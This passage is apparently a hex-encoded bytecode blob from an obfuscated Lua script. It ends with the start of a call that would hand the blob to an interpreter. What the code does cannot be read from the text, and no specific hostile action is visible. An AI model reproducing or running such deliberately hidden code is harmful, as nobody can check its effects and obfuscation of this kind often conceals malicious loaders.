002000010026130005001D000100020004113Q001D00010026130006002C000100010004113Q002C0001001205000800053Q001204000900063Q00122Q000A00073Q00122Q000B00086Q0008000B00024Q000700083Q00062Q0007007600013Q0004113Q00760001001216000800014Q000F000900093Q00261300080038000100010004113Q00380001001216000900013Q00261300090058000100020004113Q00580001001216000A00013Q002613000A0042000100020004113Q00420001001216000900093Q0004113Q00580001000E150001003E0001000A0004113Q003E0001001205000B000A3Q00120B000C000B6Q000B0002000100122Q000B000C3Q00202Q000B000B000D00122Q000D000E6Q000B000D000200202Q000B000B000F00122Q000D000C3Q00202Q000D000D001000122Q000E000C3Q002010000E000E001100120C000F000C3Q00202Q000F000F000D00122Q001100126Q000F0011000200202Q000F000F00134Q000B000F000100122Q000A00023Q00044Q003E00010026130009005B000100090004113Q005B00012Q00063Q00013Q0026130009003B000100010004113Q003B0001001216000A00013Q002613000A006D000100010004113Q006D0001001205000B000C3Q00200A000B000B000D00122Q000D00126Q000B000D000200202Q000B000B001300202Q000B000B001400122Q000D00156Q000B000D000100122Q000B00163Q00202Q000B000B001700122Q000C00024Q000D000B00020001001216000A00023Q002613000A005E000100020004113Q005E0001001216000900023Q0004113Q003B00010004113Q005E00010004113Q003B00010004113Q008100010004113Q003800010004113Q008100012Q001C00085Q001202000800183Q0004113Q008100010004113Q002C00010004113Q008100010004113Q001D00010004113Q008100010004113Q001500010004113Q008100012Q001C00045Q001202000400183Q001205000400193Q0012140005000C3Q00202Q00050005001A00122Q0007001B6Q000500076Q00043Q00024Q00040001000100044Q00A000010026130001000A000100010004113Q000A0001001216000400013Q00261300040098000100010004113Q009800010012050005001C4Q001A00050001000200302Q00050018001D00122Q000500053Q00122Q0006001E3Q00122Q000700076Q0005000700064Q000300066Q000200053Q00122Q000400023Q0026130004008C000100020004113Q008C0001001216000100023Q0004113Q000A00010004113Q008C00010004113Q000A00010004113Q00A000010004113Q000200012Q00063Q00017Q00", v9(), ...);
